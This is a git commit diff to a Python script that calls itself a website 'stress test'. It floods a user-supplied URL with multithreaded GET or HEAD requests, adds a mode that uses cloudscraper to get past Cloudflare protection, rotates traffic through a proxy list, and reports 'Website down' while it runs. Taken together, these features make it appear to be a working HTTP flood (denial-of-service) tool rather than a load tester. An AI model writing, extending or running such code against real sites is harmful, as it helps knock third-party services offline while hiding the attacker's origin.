2b4bd4f4e2252111d822f92fe85883d5cbc7aca0
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-07-17 17:52:48 +0600

    Update main.py

--- main.py
+++ main.py
@@ -1,19 +1,41 @@
 import cloudscraper
-from concurrent.futures import ThreadPoolExecutor
+import httpx
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from time import time, sleep
 from threading import Lock
 
-def send_request(url, until_datetime, scraper):
+def send_request(url, until_datetime, method, proxies=None):
     while (until_datetime - time()) > 0:
         try:
-            response = scraper.get(url)
+            if proxies:
+                proxy = proxies.pop(0)
+                proxies.append(proxy)
+                proxy_dict = {"http": proxy, "https": proxy}
+            else:
+                proxy_dict = None
+
+            if method == "get":
+                if proxy_dict:
+                    response = httpx.get(url, proxies=proxy_dict)
+                else:
+                    response = httpx.get(url)
+            elif method == "head":
+                if proxy_dict:
+                    response = httpx.head(url, proxies=proxy_dict)
+                else:
+                    response = httpx.head(url)
+            elif method == "cfb":
+                scraper = cloudscraper.create_scraper()
+                if proxy_dict:
+                    response = scraper.get(url, proxies=proxy_dict)
+                else:
+                    response = scraper.get(url)
         except Exception as e:
             pass
 
 def check_website_status(url):
     try:
-        scraper = cloudscraper.create_scraper()
-        response = scraper.head(url)
+        response = httpx.head(url)
         if response.status_code == 200:
             return True
         else:
@@ -31,15 +53,20 @@ def print_colored(text, color):
     print(f"{colors[color]}{text}{colors['end']}")
 
 if __name__ == "__main__":
+    method = input("Enter request method (get/head/cfb): ")
     url = input("Enter website URL (including http:// or https://): ")
     num_threads = int(input("Enter number of threads to use: "))
     duration = int(input("Enter duration of stress test in seconds: "))
+    use_proxies = input("Use proxies (y/n): ")
+    if use_proxies.lower() == "y":
+        with open("proxies.txt", "r") as f:
+            proxies = [line.strip() for line in f]
+    else:
+        proxies = None
     until_datetime = time() + duration
-    scraper = cloudscraper.create_scraper()
     print_colored(f"Stress test started on {url} successfully!", "blue")
     with ThreadPoolExecutor(max_workers=num_threads) as executor:
-        for _ in range(num_threads):
-            executor.submit(send_request, url, until_datetime, scraper)
+        futures = [executor.submit(send_request, url, until_datetime, method, proxies) for _ in range(num_threads)]
         while (until_datetime - time()) > 0:
             if int(until_datetime - time()) % 10 == 0:
                 if check_website_status(url):
@@ -47,4 +74,6 @@ if __name__ == "__main__":
                 else:
                     print_colored("Website down", "red")
             sleep(1)
+        for future in as_completed(futures):
+            future.result()
     print_colored("Stress test completed", "blue")
